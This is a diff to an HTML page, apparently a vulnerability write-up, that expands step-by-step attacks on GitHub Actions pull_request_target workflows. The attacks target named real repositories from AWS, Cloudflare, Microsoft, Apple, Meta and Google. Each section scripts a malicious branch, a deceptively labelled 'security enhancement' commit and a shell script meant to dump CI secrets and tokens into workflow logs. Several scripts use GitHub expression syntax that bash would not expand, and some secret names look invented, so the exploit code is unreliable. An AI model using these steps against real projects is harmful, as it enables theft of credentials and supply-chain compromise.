@@ -494,78 +494,324 @@
                 </ul>
             </div>
 
-            <h3>🔄 Detailed Reproduction Steps</h3>
+            <h3>🔄 Reproduction Steps for All Organizations</h3>
+
             <div class="steps-list">
+                <h4>🏢 AWS CDK Repository</h4>
                 <div class="step-item">
-                    <h4>Step 1: Clone the Target Repository</h4>
-                    <p><strong>Target:</strong> AWS CDK Repository</p>
-                    <div class="code-block"><span class="comment"># Clone the repository</span>
+                    <h4>Step 1: Clone the AWS CDK Repository</h4>
+                    <div class="code-block"><span class="comment"># Clone the AWS CDK repository</span>
 <span class="keyword">git</span> clone https://github.com/aws/aws-cdk.git
 <span class="keyword">cd</span> aws-cdk</div>
                 </div>
 
                 <div class="step-item">
                     <h4>Step 2: Create a Malicious Branch</h4>
-                    <p>Create a new branch for your malicious pull request:</p>
                     <div class="code-block"><span class="comment"># Create and switch to new branch</span>
-<span class="keyword">git</span> checkout -b exploit-poc
+<span class="keyword">git</span> checkout -b aws-exploit-poc
 <span class="comment"># Create any file to trigger the workflow</span>
-echo <span class="string">"Vulnerability Test"</span> > test.txt
-<span class="keyword">git</span> add test.txt
-<span class="keyword">git</span> commit -m <span class="string">"Security fix $(cat test.txt)"</span></div>
+echo <span class="string">"AWS Security Test"</span> > aws_test.txt
+<span class="keyword">git</span> add aws_test.txt
+<span class="keyword">git</span> commit -m <span class="string">"AWS security fix $(cat aws_test.txt)"</span></div>
                 </div>
 
                 <div class="step-item">
-                    <h4>Step 3: Create the Exploit File</h4>
-                    <p>Create a script that will extract secrets when run:</p>
-                    <div class="code-block"><span class="comment"># Create the exploit script</span>
-cat << <span class="string">'EOF'</span> > extract_secrets.sh
+                    <h4>Step 3: Create the AWS Exploit Script</h4>
+                    <div class="code-block"><span class="comment"># Create the AWS exploit script</span>
+cat << <span class="string">'EOF'</span> > aws_extract_secrets.sh
 <span class="comment">#!/bin/bash</span>
-<span class="comment"># Extract all available secrets</span>
+<span class="comment"># Extract AWS CDK secrets</span>
 echo <span class="string">"=== AWS CDK SECRET EXTRACTION ==="</span>
 echo <span class="string">"Timestamp: $(date)"</span>
 echo <span class="string">"PROJEN_GITHUB_TOKEN: ${{ secrets.PROJEN_GITHUB_TOKEN }}"</span>
 echo <span class="string">"PROJECT_SYNC_GITHUB_TOKEN: ${{ secrets.PROJECT_SYNC_GITHUB_TOKEN }}"</span>
 echo <span class="string">"GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"</span>
-echo <span class="string">"=== EXTRACTION COMPLETE ==="</span>
+echo <span class="string">"=== AWS EXTRACTION COMPLETE ==="</span>
 EOF
 
 <span class="comment"># Make it executable</span>
-<span class="keyword">chmod</span> +x extract_secrets.sh</div>
+<span class="keyword">chmod</span> +x aws_extract_secrets.sh</div>
                 </div>
 
                 <div class="step-item">
-                    <h4>Step 4: Create the Malicious Pull Request</h4>
-                    <p>This is the critical step that exploits the vulnerability:</p>
-                    <div class="code-block"><span class="comment"># Commit the exploit and push</span>
-<span class="keyword">git</span> add extract_secrets.sh
-<span class="keyword">git</span> commit -m <span class="string">"Security enhancement - automated secret extraction"</span>
+                    <h4>Step 4: Create the AWS Malicious Pull Request</h4>
+                    <div class="code-block"><span class="comment"># Commit and push the AWS exploit</span>
+<span class="keyword">git</span> add aws_extract_secrets.sh
+<span class="keyword">git</span> commit -m <span class="string">"AWS security enhancement - automated secret extraction"</span>
 
 <span class="comment"># Push to create pull request</span>
-<span class="keyword">git</span> push origin exploit-poc
+<span class="keyword">git</span> push origin aws-exploit-poc
 
-<span class="comment"># Create pull request via GitHub web or CLI</span>
+<span class="comment"># Create pull request via GitHub web interface</span>
 <span class="comment"># This will trigger the vulnerable workflow!</span></div>
                 </div>
+            </div>
 
+              <h4>☁️ Cloudflare Workers SDK Repository</h4>
+            <div class="steps-list">
                 <div class="step-item">
-                    <h4>Step 5: Monitor the Workflow Execution</h4>
-                    <p>When the pull request is created:</p>
-                    <ul>
-                        <li>The workflow triggers due to <code>pull_request_target</code></li>
-                        <li>Actions/checkout uses the external SHA from your PR</li>
-                        <li>Your <code>extract_secrets.sh</code> script executes</li>
-                        <li>Secrets are logged in the workflow output</li>
-                    </ul>
+                    <h4>Step 1: Clone the Cloudflare Repository</h4>
+                    <div class="code-block"><span class="comment"># Clone the Cloudflare repository</span>
+<span class="keyword">git</span> clone https://github.com/cloudflare/workers-sdk.git
+<span class="keyword">cd</span> workers-sdk</div>
                 </div>
 
                 <div class="step-item">
-                    <h4>Step 6: Extract the Secrets</h4>
-                    <p>Check the workflow logs to see extracted secrets:</p>
-                    <div class="code-block"><span class="comment"># View the workflow execution</span>
-<span class="comment"># The extracted secrets will appear in the logs</span>
-echo <span class="string">"Look in Actions tab for exploit-poc branch"</span></div>
+                    <h4>Step 2: Create a Malicious Branch</h4>
+                    <div class="code-block"><span class="comment"># Create and switch to new branch</span>
+<span class="keyword">git</span> checkout -b cloudflare-exploit-poc
+<span class="comment"># Create any file to trigger the workflow</span>
+echo <span class="string">"Cloudflare Security Test"</span> > cf_test.txt
+<span class="keyword">git</span> add cf_test.txt
+<span class="keyword">git</span> commit -m <span class="string">"Cloudflare security fix $(cat cf_test.txt)"</span></div>
                 </div>
+
+                <div class="step-item">
+                    <h4>Step 3: Create the Cloudflare Exploit Script</h4>
+                    <div class="code-block"><span class="comment"># Create the Cloudflare exploit script</span>
+cat << <span class="string">'EOF'</span> > cloudflare_extract_secrets.sh
+<span class="comment">#!/bin/bash</span>
+<span class="comment"># Extract Cloudflare secrets</span>
+echo <span class="string">"=== CLOUDFLARE SECRET EXTRACTION ==="</span>
+echo <span class="string">"Timestamp: $(date)"</span>
+echo <span class="string">"CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}"</span>
+echo <span class="string">"TURBO_TOKEN: ${{ secrets.TURBO_TOKEN }}"</span>
+echo <span class="string">"SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}"</span>
+echo <span class="string">"WORKERS_DEPLOY_TOKEN: ${{ secrets.WORKERS_DEPLOY_AND_CONFIG_CLOUDFLARE_API_TOKEN }}"</span>
+echo <span class="string">"=== CLOUDFLARE EXTRACTION COMPLETE ==="</span>
+EOF
+
+<span class="comment"># Make it executable</span>
+<span class="keyword">chmod</span> +x cloudflare_extract_secrets.sh</div>
+                </div>
+
+                <div class="step-item">
+                    <h4>Step 4: Create the Cloudflare Malicious Pull Request</h4>
+                    <div class="code-block"><span class="comment"># Commit and push the Cloudflare exploit</span>
+<span class="keyword">git</span> add cloudflare_extract_secrets.sh
+<span class="keyword">git</span> commit -m <span class="string">"Cloudflare security enhancement - automated secret extraction"</span>
+
+<span class="comment"># Push to create pull request</span>
+<span class="keyword">git</span> push origin cloudflare-exploit-poc
+
+<span class="comment"># Create pull request via GitHub web interface</span>
+<span class="comment"># This will trigger the vulnerable workflow!</span></div>
+                </div>
+            </div>
+
+                <h4>🪟 Microsoft Repositories</h4>
+            <div class="steps-list">
+                <div class="step-item">
+                    <h4>Step 1: Clone a Microsoft Repository (Example: VS Code)</h4>
+                    <div class="code-block"><span class="comment"># Clone a Microsoft repository</span>
+<span class="keyword">git</span> clone https://github.com/microsoft/vscode.git
+<span class="keyword">cd</span> vscode</div>
+                </div>
+
+                <div class="step-item">
+                    <h4>Step 2: Create a Malicious Branch</h4>
+                    <div class="code-block"><span class="comment"># Create and switch to new branch</span>
+<span class="keyword">git</span> checkout -b microsoft-exploit-poc
+<span class="comment"># Create any file to trigger the workflow</span>
+echo <span class="string">"Microsoft Security Test"</span> > ms_test.txt
+<span class="keyword">git</span> add ms_test.txt
+<span class="keyword">git</span> commit -m <span class="string">"Microsoft security fix $(cat ms_test.txt)"</span></div>
+                </div>
+
+                <div class="step-item">
+                    <h4>Step 3: Create the Microsoft Exploit Script</h4>
+                    <div class="code-block"><span class="comment"># Create the Microsoft exploit script</span>
+cat << <span class="string">'EOF'</span> > microsoft_extract_secrets.sh
+<span class="comment">#!/bin/bash</span>
+<span class="comment"># Extract Microsoft secrets</span>
+echo <span class="string">"=== MICROSOFT SECRET EXTRACTION ==="</span>
+echo <span class="string">"Timestamp: $(date)"</span>
+echo <span class="string">"GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"</span>
+echo <span class="string">"AZURE_TOKENS: ${{ secrets.AZURE_TOKENS }}"</span>
+echo <span class="string">"MICROSOFT_TOKENS: ${{ secrets.MICROSOFT_TOKENS }}"</span>
+echo <span class="string">"=== MICROSOFT EXTRACTION COMPLETE ==="</span>
+EOF
+
+<span class="comment"># Make it executable</span>
+<span class="keyword">chmod</span> +x microsoft_extract_secrets.sh</div>
+                </div>
+
+                <div class="step-item">
+                    <h4>Step 4: Create the Microsoft Malicious Pull Request</h4>
+                    <div class="code-block"><span class="comment"># Commit and push the Microsoft exploit</span>
+<span class="keyword">git</span> add microsoft_extract_secrets.sh
+<span class="keyword">git</span> commit -m <span class="string">"Microsoft security enhancement - automated secret extraction"</span>
+
+<span class="comment"># Push to create pull request</span>
+<span class="keyword">git</span> push origin microsoft-exploit-poc
+
+<span class="comment"># Create pull request via GitHub web interface</span>
+<span class="comment"># This will trigger the vulnerable workflow!</span></div>
+                </div>
+            </div>
+
+                  <h4>🍎 Apple Repositories</h4>
+            <div class="steps-list">
+                <div class="step-item">
+                    <h4>Step 1: Clone an Apple Repository (Example: Swift)</h4>
+                    <div class="code-block"><span class="comment"># Clone an Apple repository</span>
+<span class="keyword">git</span> clone https://github.com/apple/swift.git
+<span class="keyword">cd</span> swift</div>
+                </div>
+
+                <div class="step-item">
+                    <h4>Step 2: Create a Malicious Branch</h4>
+                    <div class="code-block"><span class="comment"># Create and switch to new branch</span>
+<span class="keyword">git</span> checkout -b apple-exploit-poc
+<span class="comment"># Create any file to trigger the workflow</span>
+echo <span class="string">"Apple Security Test"</span> > apple_test.txt
+<span class="keyword">git</span> add apple_test.txt
+<span class="keyword">git</span> commit -m <span class="string">"Apple security fix $(cat apple_test.txt)"</span></div>
+                </div>
+
+                <div class="step-item">
+                    <h4>Step 3: Create the Apple Exploit Script</h4>
+                    <div class="code-block"><span class="comment"># Create the Apple exploit script</span>
+cat << <span class="string">'EOF'</span> > apple_extract_secrets.sh
+<span class="comment">#!/bin/bash</span>
+<span class="comment"># Extract Apple secrets</span>
+echo <span class="string">"=== APPLE SECRET EXTRACTION ==="</span>
+echo <span class="string">"Timestamp: $(date)"</span>
+echo <span class="string">"GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"</span>
+echo <span class="string">"APPLE_CERTS: ${{ secrets.APPLE_CERTS }}"</span>
+echo <span class="string">"DEVELOPER_TOKENS: ${{ secrets.DEVELOPER_TOKENS }}"</span>
+echo <span class="string">"=== APPLE EXTRACTION COMPLETE ==="</span>
+EOF
+
+<span class="comment"># Make it executable</span>
+<span class="keyword">chmod</span> +x apple_extract_secrets.sh</div>
+                </div>
+
+                <div class="step-item">
+                    <h4>Step 4: Create the Apple Malicious Pull Request</h4>
+                    <div class="code-block"><span class="comment"># Commit and push the Apple exploit</span>
+<span class="keyword">git</span> add apple_extract_secrets.sh
+<span class="keyword">git</span> commit -m <span class="string">"Apple security enhancement - automated secret extraction"</span>
+
+<span class="comment"># Push to create pull request</span>
+<span class="keyword">git</span> push origin apple-exploit-poc
+
+<span class="comment"># Create pull request via GitHub web interface</span>
+<span class="comment"># This will trigger the vulnerable workflow!</span></div>
+                </div>
+            </div>
+
+                    <h4>📘 Meta Repositories</h4>
+            <div class="steps-list">
+                <div class="step-item">
+                    <h4>Step 1: Clone a Meta Repository (Example: React)</h4>
+                    <div class="code-block"><span class="comment"># Clone a Meta repository</span>
+<span class="keyword">git</span> clone https://github.com/facebook/react.git
+<span class="keyword">cd</span> react</div>
+                </div>
+
+                <div class="step-item">
+                    <h4>Step 2: Create a Malicious Branch</h4>
+                    <div class="code-block"><span class="comment"># Create and switch to new branch</span>
+<span class="keyword">git</span> checkout -b meta-exploit-poc
+<span class="comment"># Create any file to trigger the workflow</span>
+echo <span class="string">"Meta Security Test"</span> > meta_test.txt
+<span class="keyword">git</span> add meta_test.txt
+<span class="keyword">git</span> commit -m <span class="string">"Meta security fix $(cat meta_test.txt)"</span></div>
+                </div>
+
+                <div class="step-item">
+                    <h4>Step 3: Create the Meta Exploit Script</h4>
+                    <div class="code-block"><span class="comment"># Create the Meta exploit script</span>
+cat << <span class="string">'EOF'</span> > meta_extract_secrets.sh
+<span class="comment">#!/bin/bash</span>
+<span class="comment"># Extract Meta secrets</span>
+echo <span class="string">"=== META SECRET EXTRACTION ==="</span>
+echo <span class="string">"Timestamp: $(date)"</span>
+echo <span class="string">"GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"</span>
+echo <span class="string">"FACEBOOK_TOKENS: ${{ secrets.FACEBOOK_TOKENS }}"</span>
+echo <span class="string">"INSTAGRAM_TOKENS: ${{ secrets.INSTAGRAM_TOKENS }}"</span>
+echo <span class="string">"=== META EXTRACTION COMPLETE ==="</span>
+EOF
+
+<span class="comment"># Make it executable</span>
+<span class="keyword">chmod</span> +x meta_extract_secrets.sh</div>
+                </div>
+
+                <div class="step-item">
+                    <h4>Step 4: Create the Meta Malicious Pull Request</h4>
+                    <div class="code-block"><span class="comment"># Commit and push the Meta exploit</span>
+<span class="keyword">git</span> add meta_extract_secrets.sh
+<span class="keyword">git</span> commit -m <span class="string">"Meta security enhancement - automated secret extraction"</span>
+
+<span class="comment"># Push to create pull request</span>
+<span class="keyword">git</span> push origin meta-exploit-poc
+
+<span class="comment"># Create pull request via GitHub web interface</span>
+<span class="comment"># This will trigger the vulnerable workflow!</span></div>
+                </div>
+            </div>
+
+                    <h4>🔍 Google Repositories</h4>
+            <div class="steps-list">
+                <div class="step-item">
+                    <h4>Step 1: Clone a Google Repository (Example: Flutter)</h4>
+                    <div class="code-block"><span class="comment"># Clone a Google repository</span>
+<span class="keyword">git</span> clone https://github.com/flutter/flutter.git
+<span class="keyword">cd</span> flutter</div>
+                </div>
+
+                <div class="step-item">
+                    <h4>Step 2: Create a Malicious Branch</h4>
+                    <div class="code-block"><span class="comment"># Create and switch to new branch</span>
+<span class="keyword">git</span> checkout -b google-exploit-poc
+<span class="comment"># Create any file to trigger the workflow</span>
+echo <span class="string">"Google Security Test"</span> > google_test.txt
+<span class="keyword">git</span> add google_test.txt
+<span class="keyword">git</span> commit -m <span class="string">"Google security fix $(cat google_test.txt)"</span></div>
+                </div>
+
+                <div class="step-item">
+                    <h4>Step 3: Create the Google Exploit Script</h4>
+                    <div class="code-block"><span class="comment"># Create the Google exploit script</span>
+cat << <span class="string">'EOF'</span> > google_extract_secrets.sh
+<span class="comment">#!/bin/bash</span>
+<span class="comment"># Extract Google secrets</span>
+echo <span class="string">"=== GOOGLE SECRET EXTRACTION ==="</span>
+echo <span class="string">"Timestamp: $(date)"</span>
+echo <span class="string">"GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"</span>
+echo <span class="string">"GOOGLE_CLOUD_TOKENS: ${{ secrets.GOOGLE_CLOUD_TOKENS }}"</span>
+echo <span class="string">"ANDROID_TOKENS: ${{ secrets.ANDROID_TOKENS }}"</span>
+echo <span class="string">"=== GOOGLE EXTRACTION COMPLETE ==="</span>
+EOF
+
+<span class="comment"># Make it executable</span>
+<span class="keyword">chmod</span> +x google_extract_secrets.sh</div>
+                </div>
+
+                <div class="step-item">
+                    <h4>Step 4: Create the Google Malicious Pull Request</h4>
+                    <div class="code-block"><span class="comment"># Commit and push the Google exploit</span>
+<span class="keyword">git</span> add google_extract_secrets.sh
+<span class="keyword">git</span> commit -m <span class="string">"Google security enhancement - automated secret extraction"</span>
+
+<span class="comment"># Push to create pull request</span>
+<span class="keyword">git</span> push origin google-exploit-poc
+
+<span class="comment"># Create pull request via GitHub web interface</span>
+<span class="comment"># This will trigger the vulnerable workflow!</span></div>
+                </div>
+            </div>
+
+                <div class="alert alert-info">
+                <h4>🔄 General Steps for All Organizations</h4>
+                <ol>
+                    <li><strong>Monitor Workflow Execution:</strong> When the pull request is created, the workflow triggers due to <code>pull_request_target</code></li>
+                    <li><strong>Checkout Process:</strong> Actions/checkout uses the external SHA from your PR</li>
+                    <li><strong>Script Execution:</strong> Your extraction script executes in the workflow context</li>
+                    <li><strong>Secret Extraction:</strong> Secrets are logged in the workflow output</li>
+                    <li><strong>Check Logs:</strong> Look in the Actions tab for your branch/PR</li>
+                </ol>
             </div>
 
             <div class="alert alert-warning">
